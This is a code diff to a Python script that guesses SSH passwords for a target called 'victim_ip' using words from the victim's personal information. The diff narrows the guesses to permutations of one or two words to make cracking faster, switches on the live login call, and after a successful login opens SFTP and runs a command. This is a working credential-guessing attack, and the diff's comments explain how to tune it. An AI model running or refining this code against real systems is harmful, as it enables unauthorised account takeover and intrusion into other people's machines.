@@ -66,8 +66,12 @@ def main():
         for line in f:
             information_row.append(line.strip())
 
+    # Guidance: Since the password is not random and is likely based on the victim's personal info,
+    # we do not need to generate all permutations up to length 8 (which is 109,600 combinations).
+    # Humans typically combine 1 to 2 words. By limiting the permutation length to 2 words,
+    # we reduce the search space to 64 combinations, making the guess much faster and practical.
     all_passwords = []
-    for r in range(1, len(information_row) + 1):
+    for r in range(1, 3):
         for comb in itertools.permutations(information_row, r):
             all_passwords.append(''.join(comb))
     
@@ -77,8 +81,8 @@ def main():
     for pd in all_passwords:
         try:
             password = pd
-            # sshClient.connect(victim_ip, username=username, password=password)
-            sshClient.connect(victim_ip, username=username, password=PP)
+            sshClient.connect(victim_ip, username=username, password=password)
+            # sshClient.connect(victim_ip, username=username, password=PP)
             t = sshClient.get_transport()
             sftp = paramiko.SFTPClient.from_transport(t)
             stdin, stdout, stderr = sshClient.exec_command('ls -al')
